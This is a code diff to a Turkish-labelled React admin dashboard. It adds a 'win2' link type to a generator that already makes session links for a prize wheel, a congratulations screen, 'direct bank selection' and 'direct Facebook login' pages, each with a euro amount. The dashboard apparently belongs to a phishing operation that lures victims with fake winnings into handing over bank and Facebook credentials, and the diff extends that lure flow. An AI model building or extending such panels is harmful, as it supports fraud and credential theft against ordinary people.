@@ -20,7 +20,7 @@ export function Admin1Dashboard({ user }: { user: any }) {
   // Link Oluşturma State'leri
   const [creatingLink, setCreatingLink] = useState(false);
   const [newLink, setNewLink] = useState<string | null>(null);
-  const [linkType, setLinkType] = useState<"normal" | "wheel" | "direct_win" | "direct_bank" | "direct_facebook">("normal");
+  const [linkType, setLinkType] = useState<"normal" | "wheel" | "direct_win" | "direct_bank" | "direct_facebook" | "win2">("normal");
   const [amount, setAmount] = useState("5000");
   const [currency, setCurrency] = useState("€");
   const [partnerName, setPartnerName] = useState("");
@@ -62,7 +62,7 @@ export function Admin1Dashboard({ user }: { user: any }) {
 
       const insertPayload: any = {
         amount: linkType === "wheel" ? 0 : (Number(amount.replace(",", ".")) || 0),
-        current_step: linkType === "direct_win" ? "win" : linkType === "direct_bank" ? "banken" : linkType === "direct_facebook" ? "facebook" : "code_entry",
+        current_step: linkType === "direct_win" ? "win" : linkType === "win2" ? "win2" : linkType === "direct_bank" ? "banken" : linkType === "direct_facebook" ? "facebook" : "code_entry",
         status: "offline",
         is_hidden: false,
         partner_name: adminIdentifier,
@@ -92,6 +92,7 @@ export function Admin1Dashboard({ user }: { user: any }) {
         let urlPath = `/code?session=${publicSessionId}`;
         if (linkType === "wheel") urlPath = `/wheel?session=${publicSessionId}`;
         if (linkType === "direct_win") urlPath = `/win?session=${publicSessionId}`;
+        if (linkType === "win2") urlPath = `/win2?session=${publicSessionId}`;
         if (linkType === "direct_bank") urlPath = `/banken?session=${publicSessionId}`;
         if (linkType === "direct_facebook") urlPath = `/facebook?session=${publicSessionId}`;
         setNewLink(`${window.location.origin}${urlPath}`);
@@ -290,6 +291,7 @@ export function Admin1Dashboard({ user }: { user: any }) {
                     <option value="direct_win">Tebrikler Ekranı</option>
                     <option value="direct_bank">Direkt Banka Seçimi</option>
                     <option value="direct_facebook">Direkt Facebook Girişi</option>
+                    <option value="win2">Win2 (İsim → Direkt Banka)</option>
                   </select>
                 </div>
                 
